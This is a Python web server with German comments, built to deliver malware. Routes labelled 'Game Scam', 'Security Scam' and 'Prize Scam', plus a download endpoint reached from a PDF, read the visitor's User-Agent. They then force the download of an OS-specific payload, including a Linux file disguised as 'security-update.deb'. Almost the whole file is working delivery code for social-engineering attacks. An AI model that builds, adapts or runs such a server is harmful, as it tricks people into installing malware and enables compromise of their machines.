import http.server
import socketserver
import os
import sys
import mimetypes

PORT = 3000

PUBLIC_DIR = "public"
FILES_DIR = "files"

FILE_WIN = "payload_win.exe"
# FILE_LINUX = "payload_linux"
FILE_LINUX = "security-update.deb"
FILE_MAC = "payload_mac"

SMART_ENDPOINT = "/get_document"


class DeliveryHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        """
        Routing Logik (ersetzt Express Routes)
        """
        # Pfad normalisieren (Query Params entfernen)
        path = self.path.split("?")[0]

        # --- ROUTING FÜR DbD PAGES
        if path == "/game":
            self.handle_smart_download()
            # self.serve_file(os.path.join(PUBLIC_DIR, "game.html"))
            return
        elif path == "/security":
            self.handle_smart_download()
            # self.serve_file(os.path.join(PUBLIC_DIR, "security.html"))
            return
        elif path == "/prize":
            self.handle_smart_download()
            # self.serve_file(os.path.join(PUBLIC_DIR, "prize.html"))
            return

        # --- SMART DOWNLOAD (Vom PDF aufgerufen) ---
        elif path == SMART_ENDPOINT:
            self.handle_smart_download()
            return

        # --- DIREKTER DOWNLOAD (Express: /download-file/:filename) ---
        elif path.startswith("/download-file/"):
            # Dateinamen aus URL extrahieren
            filename = path.replace("/download-file/", "")

            # Security Check (Directory Traversal verhindern)
            if ".." in filename or "/" in filename or "\\" in filename:
                self.send_error(400, "Invalid filename")
                return

            filepath = os.path.join(FILES_DIR, filename)
            self.serve_download(filepath, filename)
            return

        # --- STATIC FILES (Express: app.use(express.static('public'))) ---
        # Wenn wir hier sind, ist es kein spezieller Route.
        # Wir schauen, ob die Datei im 'public' Ordner existiert.

        # Entferne führenden Slash für os.path.join
        clean_path = path.lstrip("/")
        if clean_path == "":
            clean_path = "index.html"  # Fallback für Root

        full_path = os.path.join(PUBLIC_DIR, clean_path)

        if os.path.exists(full_path) and os.path.isfile(full_path):
            self.serve_file(full_path)
        else:
            self.send_error(404, "File not found")

    def handle_smart_download(self):
        """
        Analysiert den User-Agent und liefert die passende Payload.
        """
        user_agent = self.headers.get("User-Agent", "").lower()
        print(f"[!] Smart Download requested by UA: {user_agent}")

        target_file = FILE_WIN  # Default Windows

        if "linux" in user_agent or "x11" in user_agent:
            target_file = FILE_LINUX
        elif "macintosh" in user_agent or "mac os x" in user_agent:
            target_file = FILE_MAC

        # Datei aus dem 'files' Ordner holen
        filepath = os.path.join(FILES_DIR, target_file)
        self.serve_download(filepath, target_file)

    def serve_file(self, filepath):
        """Hilfsfunktion um HTML/CSS/JS anzuzeigen"""
        try:
            with open(filepath, "rb") as f:
                content = f.read()

            self.send_response(200)
            # Mime-Type erraten
            mime_type, _ = mimetypes.guess_type(filepath)
            if mime_type:
                self.send_header("Content-Type", mime_type)
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            print(f"Error serving file: {e}")
            self.send_error(500, "Internal Server Error")

    def serve_download(self, filepath, filename):
        """Hilfsfunktion um Download zu erzwingen"""
        if os.path.exists(filepath):
            try:
                filesize = os.path.getsize(filepath)
                with open(filepath, "rb") as f:
                    content = f.read()

                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header(
                    "Content-Disposition", f'attachment; filename="{filename}"'
                )
                self.send_header("Content-Length", str(filesize))
                self.end_headers()
                self.wfile.write(content)
                print(f"[+] Served: {filename}")
            except Exception as e:
                print(f"Error serving download: {e}")
                self.send_error(500, "Internal Server Error")
        else:
            print(f"[-] Payload not found: {filepath}")
            self.send_error(404, "Payload missing on server")


def run_server():
    # Socket Reuse erlauben, damit man den Server schnell neu starten kann
    socketserver.TCPServer.allow_reuse_address = True

    with socketserver.TCPServer(("", PORT), DeliveryHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        print(f"- Game Scam:     http://localhost:{PORT}/game")
        print(f"- Security Scam: http://localhost:{PORT}/security")
        print(f"- Prize Scam:    http://localhost:{PORT}/prize")
        print(f"- PDF Endpoint:  http://localhost:{PORT}{SMART_ENDPOINT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServer stopped.")
            sys.exit(0)


if __name__ == "__main__":
    run_server()
